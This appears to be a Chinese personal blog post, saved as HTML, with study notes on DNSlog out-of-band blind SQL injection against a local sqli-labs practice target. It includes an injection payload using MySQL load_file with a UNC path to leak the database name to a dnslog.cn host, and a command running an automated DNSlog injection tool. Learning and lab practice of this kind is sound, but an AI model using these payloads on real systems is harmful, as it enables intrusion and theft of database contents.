@@ -1,0 +1,119 @@
+<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sql注入学习笔记#9 | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
+  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Sql注入学习笔记#9</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-06-07T05:43:07.000Z" id="date"> 2023-06-07</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-06-07T07:23:36.272Z" id="updated"> 2023-06-07</time></div></span></div></div><hr><div id="post-content"><p>这篇文章学习DNSlog注入</p>
+<span id="more"></span>
+
+<p>dnslog注入也是属于盲注的一种，</p>
+<p>效率更高</p>
+<h1 id="1-Basic"><a href="#1-Basic" class="headerlink" title="1 Basic"></a>1 Basic</h1><ol>
+<li><p>函数load_file(path)</p>
+<p>使用示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mysql&gt; select load_file(&quot;D:\\Desktop\\test.txt&quot;);<br>+------------------------------------------------------------------------+<br>| load_file(&quot;D:\\Desktop\\test.txt&quot;)                                     |<br>+------------------------------------------------------------------------+<br>| 0x746573740D0A3132330D0AE6B58BE8AF95                                   |<br>+------------------------------------------------------------------------+<br><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>unc 网络路径</p>
+<p>win+e打开文件资源管理器，</p>
+<p>在上面的路径栏输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//www.baidu.com/<br></code></pre></td></tr></table></figure>
+
+<p>你就会发现，</p>
+<p>电脑自动帮你打开了百度这个网址，</p>
+<p>那么load_file这个函数同样可以访问这么一个网络路径，</p>
+<p>我们就可以通过这来手动注入了</p>
+</li>
+</ol>
+<h1 id="2-DNSlog-手动注入"><a href="#2-DNSlog-手动注入" class="headerlink" title="2 DNSlog 手动注入"></a>2 DNSlog 手动注入</h1><p>需要的网址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">www.dnslog.cn<br></code></pre></td></tr></table></figure>
+
+<p>然后就是按照你申请的域名构造语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and load_file(concat(&#x27;//&#x27;,database(),&#x27;.&#x27;,&#x27;c3swhm.dnslog.cn/abc.txt&#x27;)) --+<br></code></pre></td></tr></table></figure>
+
+<p>然后后面一步步我就不做了，</p>
+<p>注意使用limit关键字来获取第n行的数据，</p>
+<p>不要使用group_concat()，</p>
+<p>不会有访问结果</p>
+<p>笔记：</p>
+
+
+<h1 id="3-DNSlog-自动注入"><a href="#3-DNSlog-自动注入" class="headerlink" title="3 DNSlog 自动注入"></a>3 DNSlog 自动注入</h1><p>需要用到的工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">https://github.com/ADOOO/DnsLogSqlinj<br></code></pre></td></tr></table></figure>
+
+<p>别忘了装python环境然后pip一下库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pip install gevent==1.2.2<br>pip install termcolor<br></code></pre></td></tr></table></figure>
+
+<p>啊完了。。。。。要linux才可以。。。。</p>
+<p>windows下报错</p>
+
+
+<p>这个报错不用抢救了一看就是系统的问题。。。</p>
+<p>好吧，</p>
+<p>掏出我的kali虚拟机！！！[中二]</p>
+
+
+<p>我的pip呢？？？？？</p>
+<p>【此处省略漫长的解决过程…….】</p>
+
+
+<p>终于好了。。。。</p>
+<p>现在输入命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python dnslogSql.py -u &quot;http://192.168.1.26/Less-9/?id=1&#x27; and (&#123;&#125;) --+&quot; --dbs<br></code></pre></td></tr></table></figure>
+
+<p>这其实和sqlmap差不多，</p>
+<p>我之前入门的时候就是用的sqlmap拿下的第一个靶场哈哈哈</p>
+<p>然后输入后就会在dnslog后台看到</p>
+
+
+<p>说明有6个数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mysql&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| challenges         |<br>| mysql              |<br>| performance_schema |<br>| security           |<br>| sys                |<br>+--------------------+<br>6 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
+
+<p>确实是6个数据库</p>
+<p>然后后面一步步我就不干了，</p>
+
+
+<p>泰裤辣</p>
+<h1 id="4-最后"><a href="#4-最后" class="headerlink" title="4 最后"></a>4 最后</h1><p>今天的这个与其说是教我们新函数吧，</p>
+<p>其实就是给我们一个函数利用的思路，</p>
+<p>这样我们举一反三就会效率更高！</p>
+<p>关闭我心爱的小kali，</p>
+<p>hexo g</p>
+<p>hexo d</p>
+<p>结束！</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/06/07/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-10/">← Next Sql注入学习笔记#10</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/07/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-8/">Sql注入学习笔记#8 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>不与无谓人争气</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Basic"><span class="toc-number">1.</span> <span class="toc-text">1 Basic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-DNSlog-%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">2 DNSlog 手动注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-DNSlog-%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">3 DNSlog 自动注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E6%9C%80%E5%90%8E"><span class="toc-number">4.</span> <span class="toc-text">4 最后</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
+ el: '#valine'
+ , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
+ , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: 'This comment is sent by Penguin Logistics.'
+ , path: window.location.pathname
+});code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
